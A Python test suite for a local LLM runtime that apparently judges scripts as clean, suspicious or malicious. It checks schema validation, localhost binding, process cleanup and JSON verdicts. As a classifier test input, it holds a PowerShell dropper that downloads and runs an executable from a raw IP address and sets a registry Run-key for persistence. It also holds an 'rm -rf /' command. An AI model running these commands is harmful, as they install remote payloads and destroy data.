"""Tests for cerber.llm (local LLM runtime).

Runs both ways - no pytest needed:

    . .venv/bin/activate && python tests/test_llm.py [--orphan] [--model PATH]

or ``pytest tests/test_llm.py`` if pytest is installed. Needs llama-server
(/opt/homebrew/bin/llama-server) and Granite 4.0 H Tiny (see
``cerber.llm.find_default_model``); the model tests are skipped/failed
accordingly when they are missing. The engine is always stopped in ``finally``
(and by the runtime's atexit/signal hooks), and the test verifies that no
llama-server process is left behind.
"""

from __future__ import annotations

import os
import signal
import subprocess
import sys
import textwrap
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import psutil  # noqa: E402

from cerber.llm import (  # noqa: E402
    LLMJSONError,
    LocalLLM,
    find_default_model,
    strip_reasoning,
    validate_schema,
)

VERDICT_SCHEMA = {
    "type": "object",
    "properties": {
        "verdict": {"type": "string", "enum": ["clean", "suspicious", "malicious"]},
        "confidence": {"type": "number", "minimum": 0, "maximum": 1},
        "reasons": {"type": "array", "items": {"type": "string"}, "minItems": 1, "maxItems": 5},
    },
    "required": ["verdict", "confidence", "reasons"],
    "additionalProperties": False,
}

SUSPICIOUS_SNIPPET = """\
powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
$c = New-Object Net.WebClient; $c.DownloadFile('http://185.220.101.7/a.exe', "$env:TEMP\\a.exe"); Start-Process "$env:TEMP\\a.exe"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d "$env:TEMP\\a.exe" /f
"""

_llm: LocalLLM | None = None
METRICS: dict[str, object] = {}


def _llama_servers() -> list[int]:
    out = []
    for p in psutil.process_iter(["name", "cmdline"]):
        try:
            if p.info["name"] == "llama-server":
                out.append(p.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return out


def get_llm(model: str | None = None) -> LocalLLM:
    """Module-level shared instance (started once, stopped in teardown/main)."""
    global _llm
    if _llm is None or not _llm.running:
        path = model or find_default_model()
        assert path, "no model found (granite-4.0-h-tiny*.gguf under ~/.lmstudio/models or ~/.localcode/models)"
        _llm = LocalLLM(path, ctx_size=16384)
        _llm.start(timeout=180)
        METRICS["model"] = os.path.basename(path)
        METRICS["load_s"] = round(_llm.load_seconds or 0.0, 2)
    return _llm


def teardown_module(module=None) -> None:  # pytest hook
    global _llm
    if _llm is not None:
        _llm.stop()
        _llm = None


# --------------------------------------------------------------------------- pure unit tests
def test_find_default_model():
    m = find_default_model()
    assert m is None or (m.endswith(".gguf") and os.path.isfile(m))


def test_strip_reasoning():
    assert strip_reasoning("<think>hmm</think>\nAnswer") == "Answer"
    assert strip_reasoning("hmm</think>Answer") == "Answer"
    assert strip_reasoning("Answer <think>cut") == "Answer"
    assert strip_reasoning("plain") == "plain"


def test_validate_schema():
    ok = {"verdict": "clean", "confidence": 0.5, "reasons": ["a"]}
    validate_schema(ok, VERDICT_SCHEMA)
    for bad in (
        {**ok, "verdict": "evil"},
        {**ok, "confidence": 3},
        {**ok, "reasons": []},
        {"verdict": "clean"},
        {**ok, "extra": 1},
    ):
        try:
            validate_schema(bad, VERDICT_SCHEMA)
        except ValueError:
            continue
        raise AssertionError(f"should be rejected: {bad}")


# --------------------------------------------------------------------------- model tests
def test_start_binds_localhost_only():
    llm = get_llm()
    assert llm.running and llm.pid
    assert llm.base_url and llm.base_url.startswith("http://127.0.0.1:")
    # llm.pid is the parent-death supervisor; the listener is its child (llama-server)
    tree = [psutil.Process(llm.pid), *psutil.Process(llm.pid).children(recursive=True)]
    conns = [c for p in tree for c in p.net_connections(kind="inet") if c.status == psutil.CONN_LISTEN]
    assert conns, "server is not listening"
    assert all(c.laddr.ip in ("127.0.0.1", "::1") for c in conns), conns


def test_chat_trivial():
    llm = get_llm()
    t0 = time.perf_counter()
    out = llm.chat(
        [{"role": "user", "content": "What is 17 + 25? Answer with just the number."}],
        max_tokens=32,
    )
    METRICS["chat_s"] = round(time.perf_counter() - t0, 2)
    METRICS["chat_answer"] = out
    assert "42" in out, out
    st = llm.last_stats
    assert st is not None and st.completion_tokens > 0
    METRICS["chat_gen_tps"] = round(st.gen_tps, 1)
    METRICS["chat_prompt_tps"] = round(st.prompt_tps, 1)


def test_chat_json_verdict():
    llm = get_llm()
    messages = [
        {"role": "system", "content": "You are a malware analyst. Judge the script excerpt."},
        {"role": "user", "content": f"Script excerpt:\n{SUSPICIOUS_SNIPPET}\nGive your verdict."},
    ]
    t0 = time.perf_counter()
    res = llm.chat_json(messages, VERDICT_SCHEMA, max_tokens=300)
    METRICS["json_s"] = round(time.perf_counter() - t0, 2)
    METRICS["json_result"] = res
    assert isinstance(res, dict)
    assert res["verdict"] in ("clean", "suspicious", "malicious")
    assert 0 <= res["confidence"] <= 1
    assert isinstance(res["reasons"], list) and all(isinstance(r, str) for r in res["reasons"])
    st = llm.last_stats
    if st:
        METRICS["json_gen_tps"] = round(st.gen_tps, 1)
        METRICS["json_tokens"] = st.completion_tokens


def test_chat_json_benign():
    llm = get_llm()
    messages = [
        {"role": "system", "content": "You are a malware analyst. Judge the file excerpt."},
        {"role": "user", "content": "File excerpt:\nprint('hello world')\n"},
    ]
    res = llm.chat_json(messages, VERDICT_SCHEMA, max_tokens=300)
    METRICS["benign_result"] = res
    validate_schema(res, VERDICT_SCHEMA)


def test_chat_json_truncation_error_is_reported():
    """A budget too small for the object must not return garbage silently."""
    llm = get_llm()
    try:
        llm.chat_json([{"role": "user", "content": "Analyse: rm -rf / --no-preserve-root"}],
                      VERDICT_SCHEMA, max_tokens=3)
    except LLMJSONError as exc:
        assert exc.raw is not None
        return
    # a retry with a doubled budget could in theory succeed; both outcomes are valid


def test_memory_reported():
    llm = get_llm()
    rss = llm.memory_bytes()
    assert rss and rss > 500 * 1024 * 1024
    METRICS["ram_gb"] = round(rss / 1e9, 2)


def test_stop_leaves_no_process():
    llm = get_llm()
    pid = llm.pid
    llm.stop()
    assert not llm.running
    time.sleep(0.3)
    assert not psutil.pid_exists(pid) or psutil.Process(pid).status() == psutil.STATUS_ZOMBIE
    assert pid not in _llama_servers()
    # restartable
    llm.start(timeout=180)
    assert llm.running and llm.pid != pid
    llm.chat([{"role": "user", "content": "Say OK."}], max_tokens=8)


# --------------------------------------------------------------------------- orphan test (kill -9 of the parent)
def test_no_orphan_after_sigkill_of_parent():
    """`kill -9` runs no atexit hooks: the parent-death supervisor must take the server down."""
    model = find_default_model()
    assert model, "no model"
    code = textwrap.dedent(
        f"""
        import sys, time
        sys.path.insert(0, {str(ROOT)!r})
        from cerber.llm import LocalLLM
        llm = LocalLLM({model!r}, ctx_size=2048)
        llm.start(timeout=180)
        print(llm.pid, flush=True)
        time.sleep(600)
        """
    )
    before = set(_llama_servers())
    child = subprocess.Popen([sys.executable, "-c", code], stdout=subprocess.PIPE, text=True)
    try:
        line = child.stdout.readline().strip()
        assert line.isdigit(), f"child failed to start: {line!r}"
        server_pid = int(line)
        assert psutil.pid_exists(server_pid)
        os.kill(child.pid, signal.SIGKILL)
        child.wait(10)
        deadline = time.time() + 15
        while time.time() < deadline and psutil.pid_exists(server_pid):
            time.sleep(0.25)
        gone = not psutil.pid_exists(server_pid) or psutil.Process(server_pid).status() == psutil.STATUS_ZOMBIE
        METRICS["orphan_cleanup_s"] = round(15 - (deadline - time.time()), 1)
        assert gone, f"llama-server {server_pid} survived kill -9 of its parent"
    finally:
        if child.poll() is None:
            child.kill()
        for pid in set(_llama_servers()) - before:
            try:
                os.killpg(pid, signal.SIGKILL)
            except OSError:
                pass


def test_no_orphan_after_sigterm():
    """SIGTERM (default disposition) must clean up through the runtime's handler."""
    model = find_default_model()
    assert model, "no model"
    code = textwrap.dedent(
        f"""
        import sys, time
        sys.path.insert(0, {str(ROOT)!r})
        from cerber.llm import LocalLLM
        llm = LocalLLM({model!r}, ctx_size=2048)
        llm.start(timeout=180)
        print(llm.pid, flush=True)
        time.sleep(600)
        """
    )
    before = set(_llama_servers())
    child = subprocess.Popen([sys.executable, "-c", code], stdout=subprocess.PIPE, text=True)
    try:
        line = child.stdout.readline().strip()
        assert line.isdigit(), f"child failed to start: {line!r}"
        server_pid = int(line)
        child.send_signal(signal.SIGTERM)
        child.wait(15)
        time.sleep(0.5)
        gone = not psutil.pid_exists(server_pid) or psutil.Process(server_pid).status() == psutil.STATUS_ZOMBIE
        assert gone, f"llama-server {server_pid} survived SIGTERM of its parent"
    finally:
        if child.poll() is None:
            child.kill()
        for pid in set(_llama_servers()) - before:
            try:
                os.killpg(pid, signal.SIGKILL)
            except OSError:
                pass


# --------------------------------------------------------------------------- script runner
def main(argv: list[str]) -> int:
    model = None
    if "--model" in argv:
        model = argv[argv.index("--model") + 1]
    run_orphan = "--orphan" in argv or "--all" in argv
    plain = [test_find_default_model, test_strip_reasoning, test_validate_schema]
    modeled = [
        test_start_binds_localhost_only, test_chat_trivial, test_chat_json_verdict, test_chat_json_benign,
        test_chat_json_truncation_error_is_reported, test_memory_reported, test_stop_leaves_no_process,
    ]
    orphan = [test_no_orphan_after_sigkill_of_parent, test_no_orphan_after_sigterm] if run_orphan else []
    failed = 0
    pre = set(_llama_servers())
    try:
        if model:
            get_llm(model)
        for fn in plain + modeled + orphan:
            t0 = time.perf_counter()
            try:
                fn()
                print(f"PASS  {fn.__name__}  ({time.perf_counter() - t0:.1f}s)")
            except BaseException as exc:  # noqa: BLE001
                failed += 1
                print(f"FAIL  {fn.__name__}: {type(exc).__name__}: {exc}")
    finally:
        teardown_module()
    time.sleep(0.5)
    leftover = set(_llama_servers()) - pre
    if leftover:
        failed += 1
        print(f"FAIL  orphan llama-server processes: {sorted(leftover)}")
        for pid in leftover:
            try:
                os.killpg(pid, signal.SIGKILL)
            except OSError:
                pass
    print("\nMETRICS:")
    for k, v in METRICS.items():
        print(f"  {k}: {v}")
    print(f"\n{'ALL PASSED' if not failed else f'{failed} FAILED'}")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
